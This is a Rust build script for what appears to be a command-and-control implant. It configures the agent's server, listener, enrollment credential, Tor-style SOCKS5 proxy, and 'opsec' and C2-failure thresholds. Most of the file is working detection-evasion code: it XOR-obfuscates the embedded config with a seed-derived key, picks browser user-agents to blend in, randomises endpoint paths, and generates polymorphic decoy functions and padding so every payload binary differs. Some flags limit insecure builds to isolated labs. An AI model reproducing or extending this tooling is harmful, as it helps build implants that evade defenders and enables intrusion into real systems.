use serde_json::json;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::str::FromStr;
use url::Url;

fn log_build(msg: &str) {
    println!("[BUILD] {}", msg);
}

// --- Seeded source mutation engine (issue #67, R1 milestone 0) ---
// All mutation decisions in a build derive from MUTATION_SEED (hex u64) via
// this PRNG. The complete payload is reproducible only when every build input,
// including the per-build enrollment credential, is held constant. Production
// generates that credential randomly and deliberately does not persist it raw.

// Fixed fallback used for manual builds that do not set MUTATION_SEED.
const DEV_MUTATION_SEED: u64 = 0x4d69_6372_6f43_3200;
const BOOTSTRAP_CREDENTIAL_ENCODED_BYTES: usize = 43;
const CANONICAL_BOOTSTRAP_TRAILING_CHARS: &[u8] = b"AEIMQUYcgkosw048";

// Hand-rolled splitmix64 PRNG; no external dependencies in the build script.
struct SplitMix64 {
    state: u64,
}

impl SplitMix64 {
    fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    fn next_u64(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.state;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }

    fn below(&mut self, n: u64) -> u64 {
        self.next_u64() % n
    }

    // Random lowercase alphanumeric string of the given length.
    fn alnum(&mut self, len: usize) -> String {
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
        (0..len)
            .map(|_| CHARSET[self.below(CHARSET.len() as u64) as usize] as char)
            .collect()
    }
}

// Curated user-agent pool; one is selected per seed and embedded in the config.
const USER_AGENT_POOL: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
];

fn resolve_mutation_seed() -> (u64, bool) {
    match env::var("MUTATION_SEED") {
        Ok(raw) => {
            let trimmed = raw.trim().trim_start_matches("0x");
            match u64::from_str_radix(trimmed, 16) {
                Ok(seed) => (seed, true),
                Err(_) => {
                    println!(
                        "cargo:warning=Invalid MUTATION_SEED '{}', falling back to fixed dev seed",
                        raw
                    );
                    (DEV_MUTATION_SEED, false)
                }
            }
        }
        Err(_) => (DEV_MUTATION_SEED, false),
    }
}

fn is_canonical_bootstrap_credential(raw: &str) -> bool {
    raw.len() == BOOTSTRAP_CREDENTIAL_ENCODED_BYTES
        && raw
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
        && raw
            .as_bytes()
            .last()
            .is_some_and(|byte| CANONICAL_BOOTSTRAP_TRAILING_CHARS.contains(byte))
}

fn parse_environment<T>(name: &str, default: &str) -> T
where
    T: FromStr,
    T::Err: std::fmt::Display,
{
    let raw = env::var(name).unwrap_or_else(|_| default.to_string());
    raw.parse::<T>()
        .unwrap_or_else(|err| panic!("{name} has invalid value {raw:?}: {err}"))
}

fn parse_boolean_environment(name: &str, default: bool) -> bool {
    match env::var(name) {
        Ok(raw) if raw == "true" => true,
        Ok(raw) if raw == "false" => false,
        Ok(raw) => panic!("{name} must be true or false, got {raw:?}"),
        Err(_) => default,
    }
}

fn validate_identifier(name: &str, value: &str) {
    if value.is_empty()
        || value.len() > 128
        || !value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b':'))
    {
        panic!("{name} is outside the supported identifier contract");
    }
}

fn canonical_listener_authority(host: &str, port: &str) -> String {
    let parsed_port = port
        .parse::<u16>()
        .ok()
        .filter(|port| *port != 0)
        .unwrap_or_else(|| panic!("LISTENER_PORT must be an integer from 1 through 65535"));
    let authority_host = if host.starts_with('[') && host.ends_with(']') {
        host.to_string()
    } else if host.contains(':') {
        format!("[{host}]")
    } else {
        host.to_string()
    };
    let authority = format!("{authority_host}:{parsed_port}");
    let probe = Url::parse(&format!("http://{authority}"))
        .unwrap_or_else(|err| panic!("LISTENER_HOST is invalid: {err}"));
    if probe.host_str().is_none()
        || !probe.username().is_empty()
        || probe.password().is_some()
        || probe.query().is_some()
        || probe.fragment().is_some()
        || !matches!(probe.path(), "" | "/")
    {
        panic!("LISTENER_HOST must contain only a hostname or IP address");
    }
    authority
}

fn canonical_server_url(raw: &str, protocol: &str, host: &str, port: &str) -> String {
    if !matches!(protocol, "http" | "https") {
        panic!("PROTOCOL must be http or https");
    }
    let expected = format!("{protocol}://{}", canonical_listener_authority(host, port));
    if raw != expected {
        panic!("SERVER_URL must exactly match PROTOCOL, LISTENER_HOST, and LISTENER_PORT");
    }
    let parsed = Url::parse(raw).unwrap_or_else(|err| panic!("SERVER_URL is invalid: {err}"));
    if parsed.scheme() != protocol
        || parsed.host_str().is_none()
        || !parsed.username().is_empty()
        || parsed.password().is_some()
        || parsed.query().is_some()
        || parsed.fragment().is_some()
        || !matches!(parsed.path(), "" | "/")
    {
        panic!(
            "SERVER_URL must contain only the configured http(s) scheme, host, and explicit port"
        );
    }
    expected
}

fn export_effective_config(config_content: &str) {
    let Some(requested_destination) = env::var_os("EFFECTIVE_CONFIG_PATH") else {
        return;
    };
    let mut config: serde_json::Value = serde_json::from_str(config_content)
        .unwrap_or_else(|err| panic!("failed to parse embedded config for export: {err}"));
    let config = config
        .as_object_mut()
        .unwrap_or_else(|| panic!("embedded config must be a JSON object"));
    let payload_id = config
        .get("payload_id")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_else(|| panic!("embedded config payload_id must be a string"));
    validate_identifier("PAYLOAD_ID", payload_id);
    let destination = Path::new(".microc2-build")
        .join(payload_id)
        .join("output")
        .join("effective-config.json");
    if requested_destination.as_os_str() != destination.as_os_str() {
        panic!("EFFECTIVE_CONFIG_PATH must be the private per-build effective-config path");
    }
    config.remove("enrollment_credential");
    let sanitized = serde_json::to_vec(config)
        .unwrap_or_else(|err| panic!("failed to serialize effective config: {err}"));
    fs::write(&destination, sanitized)
        .unwrap_or_else(|err| panic!("failed to write effective config to {destination:?}: {err}"));
    log_build(&format!(
        "Wrote credential-free effective config to {:?}",
        destination
    ));
}

// Generate OUT_DIR/mutation.rs: seed-derived decoy functions, random string
// constants and a random-length padding blob. The agent references
// mutation_entry() once via std::hint::black_box so LLVM keeps everything.
fn generate_mutation_module(rng: &mut SplitMix64, out_dir: &Path) {
    let decoy_count = 2 + rng.below(4) as usize; // 2..=5 decoy functions
    let padding_len = 64 + rng.below(449) as usize; // 64..=511 bytes

    let mut code = String::new();
    code.push_str("// Generated by build.rs from MUTATION_SEED. Do not edit.\n");

    // Random-length padding blob, unique per seed.
    code.push_str(&format!(
        "pub const MUTATION_PADDING: [u8; {}] = [\n    ",
        padding_len
    ));
    let padding: Vec<String> = (0..padding_len)
        .map(|_| format!("0x{:02x}", rng.next_u64() as u8))
        .collect();
    code.push_str(&padding.join(", "));
    code.push_str("\n];\n\n");

    // Random string constants.
    for i in 0..3 {
        let len = 16 + rng.below(33) as usize; // 16..=48 chars
        code.push_str(&format!(
            "pub const DECOY_STR_{}: &str = \"{}\";\n",
            i,
            rng.alnum(len)
        ));
    }
    code.push('\n');

    // Decoy functions with seed-derived arithmetic.
    let mut decoy_names = Vec::new();
    for _ in 0..decoy_count {
        let name = format!("decoy_{:08x}", rng.next_u64() as u32);
        let multiplier = rng.next_u64() | 1; // odd multiplier
        let mask = rng.next_u64();
        code.push_str(&format!(
            "#[inline(never)]\nfn {}(x: u64) -> u64 {{\n    (x.wrapping_mul(0x{:016x})) ^ 0x{:016x}\n}}\n\n",
            name, multiplier, mask
        ));
        decoy_names.push(name);
    }

    // Entry point folding all artifacts into one value so nothing is stripped.
    code.push_str(
        "pub fn mutation_entry() -> u64 {\n    let mut acc = MUTATION_PADDING[0] as u64;\n",
    );
    code.push_str(
        "    for (i, b) in MUTATION_PADDING.iter().enumerate() {\n        acc = acc.wrapping_add((*b as u64).wrapping_mul(i as u64 + 1));\n    }\n",
    );
    for i in 0..3 {
        code.push_str(&format!(
            "    acc ^= DECOY_STR_{}.as_bytes().iter().fold(0u64, |a, b| a.wrapping_mul(31).wrapping_add(*b as u64));\n",
            i
        ));
    }
    for name in &decoy_names {
        code.push_str(&format!("    acc = {}(acc);\n", name));
    }
    code.push_str("    acc\n}\n");

    let dest = out_dir.join("mutation.rs");
    if let Err(e) = fs::write(&dest, code) {
        panic!("Failed to write mutation.rs: {}", e);
    }
    log_build(&format!("Wrote mutation module to {:?}", dest));
}

fn main() {
    log_build("Build script started");
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=config.json");
    println!("cargo:rerun-if-env-changed=LISTENER_HOST");
    println!("cargo:rerun-if-env-changed=LISTENER_PORT");
    println!("cargo:rerun-if-env-changed=SERVER_URL");
    println!("cargo:rerun-if-env-changed=LISTENER_ID");
    println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
    println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
    println!("cargo:rerun-if-env-changed=PROTOCOL");
    println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
    println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
    println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
    println!("cargo:rerun-if-env-changed=ALLOW_INVALID_CERTS");
    println!("cargo:rerun-if-env-changed=ENROLLMENT_CREDENTIAL");
    println!("cargo:rerun-if-env-changed=ALLOW_INSECURE_ISOLATED_LAB");
    println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
    println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
    println!("cargo:rerun-if-env-changed=C2_THRESH_DEC_FACTOR");
    println!("cargo:rerun-if-env-changed=C2_THRESH_ADJ_INTERVAL");
    println!("cargo:rerun-if-env-changed=C2_THRESH_MAX_MULT");
    println!("cargo:rerun-if-env-changed=PROC_SCAN_INTERVAL_SECS");
    println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_BG_TO_REDUCED");
    println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_REDUCED_TO_FULL");
    println!("cargo:rerun-if-env-changed=MIN_FULL_OPSEC_SECS");
    println!("cargo:rerun-if-env-changed=MIN_REDUCED_OPSEC_SECS");
    println!("cargo:rerun-if-env-changed=MIN_BG_OPSEC_SECS");
    println!("cargo:rerun-if-env-changed=REDUCED_ACTIVITY_SLEEP_SECS");
    println!("cargo:rerun-if-env-changed=MUTATION_SEED");
    println!("cargo:rerun-if-env-changed=EFFECTIVE_CONFIG_PATH");

    // Resolve the mutation seed; server-driven builds always set it, manual
    // builds fall back to a fixed dev seed so existing fixtures keep working.
    let (mutation_seed, seed_from_env) = resolve_mutation_seed();
    if !seed_from_env {
        println!(
            "cargo:warning=MUTATION_SEED not set; using fixed dev seed {:016x} (not for lab measurement builds)",
            DEV_MUTATION_SEED
        );
    }
    log_build(&format!("MUTATION_SEED: {:016x}", mutation_seed));
    // Let the agent binary report its own seed at runtime.
    println!("cargo:rustc-env=MUTATION_SEED_USED={:016x}", mutation_seed);

    let mut rng = SplitMix64::new(mutation_seed);
    // Seed-derived random config XOR key (16 bytes, hex-encoded) replacing the
    // previous payload_id-derived key, which was known to the server.
    let mut xor_key_bytes = [0u8; 16];
    for chunk in xor_key_bytes.chunks_mut(8) {
        chunk.copy_from_slice(&rng.next_u64().to_le_bytes());
    }
    let xor_key = xor_key_bytes
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect::<String>();
    // Seed-selected user-agent and randomized endpoint path segments. The path
    // segments are recorded in the config for the Phase 2 transport profiles;
    // the v0 agent keeps using the fixed routes.
    let user_agent = USER_AGENT_POOL[rng.below(USER_AGENT_POOL.len() as u64) as usize];
    let endpoint_segments: Vec<String> = (0..2).map(|_| rng.alnum(8)).collect();

    // Get configuration from environment variables
    let server_host = env::var("LISTENER_HOST").unwrap_or_default();
    let server_port = env::var("LISTENER_PORT").unwrap_or_default();
    let server_url = env::var("SERVER_URL").unwrap_or_default();
    let listener_id = env::var("LISTENER_ID").unwrap_or_default();
    let sleep_interval = parse_environment::<u64>("SLEEP_INTERVAL", "60");
    let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
    let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
        if server_port == "443" {
            "https".to_string()
        } else {
            "http".to_string()
        }
    });
    let socks5_enabled = parse_boolean_environment("SOCKS5_ENABLED", false);
    let socks5_host = env::var("SOCKS5_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
    let socks5_port = parse_environment::<u16>("SOCKS5_PORT", "9050");
    let allow_invalid_certs = parse_boolean_environment("ALLOW_INVALID_CERTS", false);
    let enrollment_credential = env::var("ENROLLMENT_CREDENTIAL").unwrap_or_default();
    let allow_insecure_isolated_lab =
        parse_boolean_environment("ALLOW_INSECURE_ISOLATED_LAB", false);

    if allow_invalid_certs && !allow_insecure_isolated_lab {
        panic!(
            "ALLOW_INVALID_CERTS=true requires ALLOW_INSECURE_ISOLATED_LAB=true for an isolated lab build"
        );
    }

    // Debug formatting escapes control characters in untrusted environment
    // strings, preventing a rejected build input from forging build-log lines.
    log_build(&format!("LISTENER_HOST: {:?}", server_host));
    log_build(&format!("LISTENER_PORT: {:?}", server_port));
    log_build(&format!("SERVER_URL: {:?}", server_url));
    log_build(&format!("LISTENER_ID: {:?}", listener_id));
    log_build(&format!("SLEEP_INTERVAL: {}", sleep_interval));
    log_build(&format!("PAYLOAD_ID: {:?}", payload_id));
    log_build(&format!("PROTOCOL: {:?}", protocol));
    log_build(&format!("SOCKS5_ENABLED: {}", socks5_enabled));
    log_build(&format!("SOCKS5_HOST: {:?}", socks5_host));
    log_build(&format!("SOCKS5_PORT: {}", socks5_port));
    log_build(&format!("ALLOW_INVALID_CERTS: {}", allow_invalid_certs));
    log_build(&format!(
        "ENROLLMENT_CREDENTIAL: {}",
        if enrollment_credential.is_empty() {
            "<not set>"
        } else {
            "<redacted>"
        }
    ));
    log_build(&format!(
        "ALLOW_INSECURE_ISOLATED_LAB: {}",
        allow_insecure_isolated_lab
    ));

    // Only use environment config if we have all required values
    let production_input_present = [
        &server_host,
        &server_port,
        &server_url,
        &listener_id,
        &payload_id,
        &enrollment_credential,
    ]
    .iter()
    .any(|value| !value.is_empty());
    let config_content = if production_input_present {
        if server_host.is_empty()
            || server_port.is_empty()
            || server_url.is_empty()
            || listener_id.is_empty()
            || payload_id.is_empty()
        {
            panic!(
                "LISTENER_HOST, LISTENER_PORT, SERVER_URL, LISTENER_ID, and PAYLOAD_ID are required together"
            );
        }
        validate_identifier("LISTENER_ID", &listener_id);
        validate_identifier("PAYLOAD_ID", &payload_id);
        if enrollment_credential.is_empty() {
            panic!("ENROLLMENT_CREDENTIAL is required for an agent payload build");
        }
        if !is_canonical_bootstrap_credential(&enrollment_credential) {
            panic!(
                "ENROLLMENT_CREDENTIAL must be a canonical 32-byte unpadded base64url credential"
            );
        }
        if protocol != "https" && !allow_insecure_isolated_lab {
            panic!("non-HTTPS agent payload builds require ALLOW_INSECURE_ISOLATED_LAB=true");
        }
        let server_url = canonical_server_url(&server_url, &protocol, &server_host, &server_port);
        log_build("Using environment variables for config");
        let config = json!({
            "server_url": server_url,
            "sleep_interval": sleep_interval,
            "jitter": 2,
            "payload_id": payload_id,
            "agent_id": "",
            "listener_id": listener_id,
            "enrollment_credential": enrollment_credential,
            "protocol": protocol,
            "user_agent": user_agent,
            "mutation_seed": format!("{mutation_seed:016x}"),
            "mutation_endpoint_segments": endpoint_segments,
            "socks5_enabled": socks5_enabled,
            "socks5_host": socks5_host,
            "socks5_port": socks5_port,
            "allow_invalid_certs": allow_invalid_certs,
            "allow_insecure_isolated_lab": allow_insecure_isolated_lab,
            "base_score_threshold_bg_to_reduced":
                parse_environment::<f32>("BASE_SCORE_THRESHOLD_BG_TO_REDUCED", "20.0"),
            "base_score_threshold_reduced_to_full":
                parse_environment::<f32>("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL", "60.0"),
            "min_duration_full_opsec_secs":
                parse_environment::<u64>("MIN_FULL_OPSEC_SECS", "300"),
            "min_duration_background_opsec_secs":
                parse_environment::<u64>("MIN_BG_OPSEC_SECS", "60"),
            "base_max_consecutive_c2_failures":
                parse_environment::<u32>("BASE_MAX_C2_FAILS", "5"),
            "min_duration_reduced_activity_secs":
                parse_environment::<u64>("MIN_REDUCED_OPSEC_SECS", "120"),
            "reduced_activity_sleep_secs":
                parse_environment::<u64>("REDUCED_ACTIVITY_SLEEP_SECS", "120"),
            "c2_failure_threshold_increase_factor":
                parse_environment::<f32>("C2_THRESH_INC_FACTOR", "1.1"),
            "c2_failure_threshold_decrease_factor":
                parse_environment::<f32>("C2_THRESH_DEC_FACTOR", "0.9"),
            "c2_threshold_adjust_interval_secs":
                parse_environment::<u64>("C2_THRESH_ADJ_INTERVAL", "3600"),
            "c2_dynamic_threshold_max_multiplier":
                parse_environment::<f32>("C2_THRESH_MAX_MULT", "2.0"),
            "proc_scan_interval_secs":
                parse_environment::<u64>("PROC_SCAN_INTERVAL_SECS", "300"),
        });
        serde_json::to_string_pretty(&config)
            .unwrap_or_else(|err| panic!("failed to serialize embedded config: {err}"))
    } else if let Ok(content) = fs::read_to_string("config.json") {
        log_build("Using config.json file for config");
        // We assume config.json contains the new fields if needed,
        // otherwise serde(default) in AgentConfig will handle it.
        content
    } else {
        log_build("No valid config found, using default embedded config");
        // Update the hardcoded fallback JSON
        r#"{
            "server_url": "",
            "sleep_interval": 5,
            "jitter": 2,
            "payload_id": "",
            "agent_id": "",
            "listener_id": "",
            "enrollment_credential": "",
            "protocol": "http",
            "socks5_enabled": false,
            "socks5_host": "127.0.0.1",
            "socks5_port": 9050,
            "allow_invalid_certs": false,
            "allow_insecure_isolated_lab": false,
            "base_score_threshold_bg_to_reduced": 20.0,
            "base_score_threshold_reduced_to_full": 60.0,
            "min_duration_full_opsec_secs": 300,
            "min_duration_background_opsec_secs": 60,
            "base_max_consecutive_c2_failures": 5,
            "min_duration_reduced_activity_secs": 120,
            "reduced_activity_sleep_secs": 120,
            "c2_failure_threshold_increase_factor": 1.0,
            "c2_failure_threshold_decrease_factor": 1.0,
            "c2_threshold_adjust_interval_secs": {},
            "c2_dynamic_threshold_max_multiplier": 1.0
        }"#
        .replace("{}", &u64::MAX.to_string())
        .to_string()
    };

    export_effective_config(&config_content);

    // Generate Rust code with the embedded config
    let out_dir: PathBuf = match env::var_os("OUT_DIR") {
        Some(value) => value.into(),
        None => {
            log_build("OUT_DIR is not set; cannot write generated config");
            return;
        }
    };
    let dest_path = out_dir.join("config.rs");
    log_build(&format!("Writing embedded config to {:?}", dest_path));

    // XOR-obfuscate the config with the seed-derived random key. The const
    // interface consumed by src/config.rs is unchanged.
    let mut obfuscated_config_bytes = config_content.as_bytes().to_vec();
    for (i, byte) in obfuscated_config_bytes.iter_mut().enumerate() {
        *byte ^= xor_key.as_bytes()[i % xor_key.len()];
    }
    let hex_obfuscated_config = obfuscated_config_bytes
        .iter()
        .map(|b| format!("{:02x}", b))
        .collect::<String>();
    let config_code = format!(
        r###"pub const EMBEDDED_CONFIG_HEX: &str = r#"{}"#;
            pub const EMBEDDED_CONFIG_XOR_KEY: &str = r#"{}"#; // Seed-derived random key
            "###,
        hex_obfuscated_config, xor_key
    );
    if let Err(e) = fs::write(&dest_path, config_code) {
        log_build(&format!("Failed to write config.rs: {}", e));
        panic!("Failed to write config.rs: {}", e);
    } else {
        log_build("Embedded config written successfully with seed-derived XOR key.");
    }

    // Emit the seed-derived junk-code module alongside the config.
    generate_mutation_module(&mut rng, &out_dir);
}
